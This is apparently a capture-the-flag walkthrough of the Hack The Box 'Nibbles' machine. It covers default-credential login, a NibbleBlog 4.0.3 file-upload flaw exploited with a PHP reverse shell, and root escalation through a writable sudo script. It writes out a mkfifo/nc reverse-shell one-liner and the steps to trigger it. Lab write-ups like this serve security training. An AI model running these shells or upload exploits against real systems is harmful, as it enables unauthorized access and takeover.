## Enumeration

Nmap results show only TCP ports 22 and 80 open. Port 80 is running Apache 2.4.18 on Ubuntu.

```

```

Navigating to the page on port 80 only shows a simple *Hello world!* text. However, if we look at the source of the page, we can see a reference to a `/nibbleblog` directory.

```html
<b>Hello world!</b>














<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

If we navigate to `/nibbleblog`, we can see a Nibble Blog layout.

A directory search found the admin page at `/nibbleblog/admin.php`.

After trying a few simple SQL injections on the admin page and main blog site, I got the below error when trying to get back to the main page. It seems that there might be some protection against brute-forcing. After a few minutes, I was able to access the pages as normal.

## Initial Shell

### Admin Panel

Before we go getting complicated with SQL injections on the admin page, we should try some easy password guesses. I was able to login with the credentials `admin:nibbles`.

![](/assets/htb-nibbles/admin_panel.png)

Under *Settings*, we can see that this is version 4.0.3 of NibbleBlog, which is vulnerable to a file upload vulnerability, [as detailed here](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html).

![](/assets/htb-nibbles/nibbles_version.png)

To exploit the file upload vulnerability, we need to make sure the My Image plugin is enabled, which it is.

![](/assets/htb-nibbles/admin_plugins.png)

Clicking *Configure* brings us to an upload page, allowing us to upload a file.

![](/assets/htb-nibbles/admin_myimage.png)

For our shell, I used the [PenTest Monkey PHP reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell), built in to Kali. I copied it to the working directory, and modified it to point to my IP, and port 7500.

Once it's set, we just need to browse to the PHP shell, and upload it. Note that you'll get the warnings below, but they can be ignored.

![](/assets/htb-nibbles/upload_warnings.png)

Open a listener with `nc -lvnp 7500`, and navigate to `http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php` to trigger the shell. You'll see a shell for `nibbler` show up on the listener.

![](/assets/htb-nibbles/initial_shell.png)

We can grab `user.txt` from `/home/nibbler/user.txt`

## Privilege Escalation

Now that we have a shell, let's run `LinEnum.sh` to enumerate the system. From the output, we can see that `nibbler` can run `/home/nibbler/personal/stuff/monitor.sh` as `root`.

![](/assets/htb-nibbles/sudoers_nibbler.png)

If we look at the contents of `/home/nibbler`, we can see that there is no `personal` directory, but we do see a file called `personal.zip`.

![](/assets/htb-nibbles/home_dir.png)

If we unzip this file in place, we can see that it contains `personal/stuff/monitor.sh`, which is what we needed for `sudo` to work.

![](/assets/htb-nibbles/unzip.png)

Looking at the contents of `monitor.sh`, we can see that it's a pre-built script to review certain system functions.

```bash

```

Most interestingly, we see that the file permissions have made it writable.

All we'll need to do is add a line to the end of the script, containing our reverse shell.

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.20 7600 > /tmp/f" >> monitor.sh
```

Open a listener with `nc -lvnp 7600`, and run `sudo /home/nibbler/personal/stuff/monitor.sh` to kick off the script. We can see the reverse shell on the listener, and grab `root.txt` from `/root/root.txt`.
